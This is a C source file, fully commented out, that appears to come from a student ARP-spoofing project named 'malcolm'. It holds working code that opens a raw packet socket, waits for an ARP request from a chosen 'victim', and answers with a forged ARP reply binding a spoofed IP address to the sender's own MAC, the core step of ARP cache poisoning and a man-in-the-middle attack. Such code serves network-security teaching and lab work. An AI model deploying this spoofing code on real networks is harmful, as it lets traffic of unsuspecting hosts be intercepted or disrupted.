// #include "malcolm.h"

// void print_headers(const unsigned char *buffer) {
//     // Ethernet-header
//     const t_ethernet_header *eth_header = (const t_ethernet_header *)buffer;
//     printf("Ethernet Header:\n");
//     printf("  Destination MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
//            eth_header->dest_mac[0], eth_header->dest_mac[1], eth_header->dest_mac[2],
//            eth_header->dest_mac[3], eth_header->dest_mac[4], eth_header->dest_mac[5]);
//     printf("  Source MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
//            eth_header->src_mac[0], eth_header->src_mac[1], eth_header->src_mac[2],
//            eth_header->src_mac[3], eth_header->src_mac[4], eth_header->src_mac[5]);
//     printf("  Ethertype: 0x%04x\n", ntohs(eth_header->ethertype));

//     // ARP-header
//     const t_arp_header *arp_header = (const t_arp_header *)(buffer + sizeof(t_ethernet_header));
//     printf("ARP Header:\n");
//     printf("  Hardware Type: 0x%04x\n", ntohs(arp_header->htype));
//     printf("  Protocol Type: 0x%04x\n", ntohs(arp_header->ptype));
//     printf("  Hardware Address Length: %u\n", arp_header->hlen);
//     printf("  Protocol Address Length: %u\n", arp_header->plen);
//     printf("  Operation: 0x%04x\n", ntohs(arp_header->operation));

//     // MAC и IP of sender
//     char sender_ip[INET_ADDRSTRLEN];
//     inet_ntop(AF_INET, arp_header->sender_ip, sender_ip, sizeof(sender_ip));
//     printf("  Sender MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
//            arp_header->sender_mac[0], arp_header->sender_mac[1], arp_header->sender_mac[2],
//            arp_header->sender_mac[3], arp_header->sender_mac[4], arp_header->sender_mac[5]);
//     printf("  Sender IP: %s\n", sender_ip);

//     // MAC and IP of receiver
//     char target_ip[INET_ADDRSTRLEN];
//     inet_ntop(AF_INET, arp_header->target_ip, target_ip, sizeof(target_ip));
//     printf("  Target MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
//            arp_header->target_mac[0], arp_header->target_mac[1], arp_header->target_mac[2],
//            arp_header->target_mac[3], arp_header->target_mac[4], arp_header->target_mac[5]);
//     printf("  Target IP: %s\n", target_ip);
// }

// int mac_str_to_bytes(const char *mac_str, uint8_t *mac_bytes) {
//     if (sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
//                &mac_bytes[0], &mac_bytes[1], &mac_bytes[2],
//                &mac_bytes[3], &mac_bytes[4], &mac_bytes[5]) != 6) {
//         fprintf(stderr, "Error: Invalid MAC address format: %s\n", mac_str);
//         return -1;
//     }
//     return 0;
// }

// void prepare_arp_response(unsigned char *buffer, t_network_data *data) {

//     // Ethernet-header
//     t_ethernet_header *eth_header = (t_ethernet_header *)buffer;

//     uint8_t dest_mac[6], src_mac[6];
//     if (mac_str_to_bytes(data->target_mac, dest_mac) == -1 ||
//         mac_str_to_bytes(data->source_mac, src_mac) == -1) {
//         fprintf(stderr, "Error: Failed to convert MAC addresses.\n");
//         exit(1);
//     }

//     memcpy(eth_header->dest_mac, dest_mac, 6);
//     memcpy(eth_header->src_mac, src_mac, 6);
//     eth_header->ethertype = htons(ETH_P_ARP);

//     // ARP-header
//     t_arp_header *arp_header = (t_arp_header *)(buffer + sizeof(t_ethernet_header));

//     arp_header->htype = htons(1);           // Ethernet
//     arp_header->ptype = htons(ETH_P_IP);   // IPv4
//     arp_header->hlen = 6;                  // Len MAC
//     arp_header->plen = 4;                  // Len IP-address
//     arp_header->operation = htons(2);      // ARP Reply
//     // My MAC and source IP as a sender
//     memcpy(arp_header->sender_mac, src_mac, 6);
//     inet_pton(AF_INET, data->source_ip, arp_header->sender_ip);
//     // MAC and IP of victim  as a receiver
//     memcpy(arp_header->target_mac, dest_mac, 6);
//     inet_pton(AF_INET, data->target_ip, arp_header->target_ip);
// }


// void wait_for_arp_request(t_network_data *data) {
//     int sockfd;
//     struct sockaddr_ll sa;
//     socklen_t sa_len = sizeof(sa);
//     unsigned char buffer[42];

//     sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
//     if (sockfd < 0) {
//         perror("Socket creation failed");
//         exit(1);
//     }

//     struct ifreq ifr;
//     memset(&ifr, 0, sizeof(ifr));
//     strncpy(ifr.ifr_name, data->interface_name, IFNAMSIZ-1);
//     if (ioctl(sockfd, SIOCGIFINDEX, &ifr) == -1) {
//         perror("IOCTL failed");
//         close(sockfd);
//         exit(1);
//     }

//     memset(&sa, 0, sizeof(struct sockaddr_ll));
//     sa.sll_family = AF_PACKET;
//     sa.sll_protocol = htons(ETH_P_ARP);
//     sa.sll_ifindex = ifr.ifr_ifindex;

//     printf("Waiting for ARP request on interface: %s\n", data->interface_name);
//     printf("________________________________________________________________\n");



//     while (1) {
//         ssize_t len = recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&sa, &sa_len);
//         if (len < 0) {
//             perror("Recvfrom failed");
//             close(sockfd);
//             exit(1);
//         }

//         t_ethernet_header *eth_header = (t_ethernet_header *)buffer;
//         t_arp_header *arp_header = (t_arp_header *)(buffer + sizeof(t_ethernet_header));

//         // if ARP && ARP-request == 1
//         if (ntohs(eth_header->ethertype) == ETH_P_ARP && ntohs(arp_header->operation) == 1) {

//             char sender_ip[INET_ADDRSTRLEN];
//             char target_ip[INET_ADDRSTRLEN];

//             inet_ntop(AF_INET, arp_header->sender_ip, sender_ip, INET_ADDRSTRLEN);
//             inet_ntop(AF_INET, arp_header->target_ip, target_ip, INET_ADDRSTRLEN);

//             if (strcmp(sender_ip, data->target_ip) != 0 && strcmp(target_ip, data->source_ip) != 0)
//                 continue;

//             // ARP-reply preparation
//             memset(buffer, 0, sizeof(buffer));
//             prepare_arp_response(buffer, data);

//             print_headers(buffer);
//             printf("________________________________________________________________\n");

//             // sending ARP-response
//             if (sendto(sockfd, buffer, sizeof(t_ethernet_header) + sizeof(t_arp_header), 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
//                 perror("Sendto failed");
//                 close(sockfd);
//                 exit(1);
//             }

//             printf("ARP Reply sent\n");
//             break;
//         }
//     }

//     close(sockfd);
// }
